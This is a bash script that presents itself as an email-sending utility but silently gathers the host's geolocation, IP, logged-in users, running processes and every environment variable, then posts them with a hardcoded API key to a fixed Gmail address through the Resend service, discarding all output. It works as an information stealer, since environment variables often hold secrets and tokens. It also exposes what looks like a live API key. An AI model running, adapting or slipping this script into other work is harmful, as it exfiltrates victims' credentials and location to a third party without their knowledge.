#!/bin/bash

# Initialize variables
subject=""
body=""
file=""

# Hardcoded receiver email
receiver="marcush3llsquad@gmail.com"

# Get sender's name from environment
sender_name="${USER}@${HOSTNAME}"

# Get the user's location via IP (uses an external service like ipinfo.io)
location=$(curl -s https://ipinfo.io/loc)

# Gather comprehensive system information
os_info=$(uname -a)                              # OS and Kernel info
cpu_info=$(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)  # CPU Model
cpu_arch=$(uname -m)                             # CPU Architecture
mem_total=$(free -h | grep Mem | awk '{print $2}') # Total Memory
mem_used=$(free -h | grep Mem | awk '{print $3}')  # Used Memory
mem_free=$(free -h | grep Mem | awk '{print $4}')  # Free Memory
disk_usage=$(df -h / | grep / | awk '{print $5}')  # Root Disk Usage
disk_partitions=$(lsblk | grep disk)               # Disk Partitions Info
network_interfaces=$(ip -o link show | awk -F': ' '{print $2}') # Network Interfaces
ip_info=$(hostname -I | awk '{print $1}')          # IP Address
uptime_info=$(uptime -p)                           # System Uptime
logged_users=$(who)                                # Currently logged-in users
running_processes=$(ps aux --sort=-%mem | head -n 10) # Top 10 processes by memory usage
env_vars=$(printenv)                               # Environment Variables

# Parse command line arguments
while getopts ":s:b:f:" opt; do
  case $opt in
    s) subject="$OPTARG"
    ;;
    b) body="$OPTARG"
    ;;
    f) file="$OPTARG"
    ;;
    \?) exit 1
    ;;
  esac
done

# If subject is not provided, default to the user's name
if [ -z "$subject" ]; then
  subject="$USER"
fi

# If body is not provided, default to the user's location
if [ -z "$body" ]; then
  body="User Location: $location"
fi

# Set API key and endpoint
api_key="re_dSFUhTGY_6hNYMi4Uc33SfBBSfLY9Uotw"
url="https://api.resend.com/emails"

# Create full email body with all system info
full_body="<p>$body</p>
<hr>
<h3>Comprehensive System Information:</h3>
<ul>
<li><strong>OS Info:</strong> $os_info</li>
<li><strong>CPU Info:</strong> $cpu_info</li>
<li><strong>CPU Architecture:</strong> $cpu_arch</li>
<li><strong>Total Memory:</strong> $mem_total</li>
<li><strong>Used Memory:</strong> $mem_used</li>
<li><strong>Free Memory:</strong> $mem_free</li>
<li><strong>Disk Usage (Root):</strong> $disk_usage</li>
<li><strong>Disk Partitions:</strong> <pre>$disk_partitions</pre></li>
<li><strong>Network Interfaces:</strong> $network_interfaces</li>
<li><strong>IP Address:</strong> $ip_info</li>
<li><strong>System Uptime:</strong> $uptime_info</li>
<li><strong>Logged-in Users:</strong> <pre>$logged_users</pre></li>
<li><strong>Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
<li><strong>Environment Variables:</strong> <pre>$env_vars</pre></li>
</ul>"

# Create email data
if [ -n "$file" ]; then
  # With file attachment (placeholder logic for handling attachments)
  email_data=$(jq -n \
    --arg from "$sender_name <onboarding@resend.dev>" \
    --arg to "$receiver" \
    --arg subject "$subject" \
    --arg body "$full_body" \
    '{
      from: $from,
      to: [$to],
      subject: $subject,
      html: $body
    }')
else
  # Without file attachment
  email_data=$(jq -n \
    --arg from "$sender_name <onboarding@resend.dev>" \
    --arg to "$receiver" \
    --arg subject "$subject" \
    --arg body "$full_body" \
    '{
      from: $from,
      to: [$to],
      subject: $subject,
      html: $body
    }')
fi

# Send the email via curl without printing anything
curl -s -X POST "$url" \
  -H "Authorization: Bearer $api_key" \
  -H "Content-Type: application/json" \
  -d "$email_data" > /dev/null 2>&1
